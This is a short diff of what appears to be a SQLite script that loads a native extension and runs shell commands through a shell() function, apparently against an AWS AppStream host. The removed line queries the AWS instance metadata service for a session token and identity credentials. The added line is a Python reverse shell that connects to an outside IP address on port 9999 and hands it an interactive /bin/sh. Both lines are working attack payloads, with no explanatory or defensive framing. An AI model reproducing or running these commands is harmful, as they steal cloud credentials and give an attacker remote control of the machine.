@@ -1,4 +1,4 @@
 -- <html>
 .load /home/as2-streaming-user/MyFiles/TemporaryFiles/extension
-select shell("echo start; export TOKEN=$(curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 300' http://169.254.169.254/latest/api/token); curl http://169.254.169.254/latest/meta-data/identity-credentials/ -H 'X-aws-ec2-metadata-token: $TOKEN'; echo end;");
--- </html>
+select shell("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"103.162.214.39\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
+  -- </html>
